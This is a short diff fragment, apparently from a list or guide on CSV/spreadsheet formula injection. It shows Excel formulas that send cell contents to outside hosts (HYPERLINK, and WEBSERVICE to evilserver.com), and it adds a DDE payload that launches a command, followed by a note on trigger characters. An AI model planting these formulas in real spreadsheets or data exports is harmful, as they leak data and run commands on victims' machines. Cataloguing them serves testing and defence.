@@ -4,6 +4,7 @@
 =HYPERLINK("http://linux.im?test="&A2&A3,"Error: Please click me!")
 =2+5
 =WEBSERVICE(CONCATENATE("http://evilserver.com/evilA...", A2,B2,C2,D2,))
+@SUM(cmd|'/c calc'!A0)
 
 ----------------------------------------------------------分割线-----------------------------------------------
 In fact, the following symbols can be used to trigger formula interpretation in Microsoft Excel:
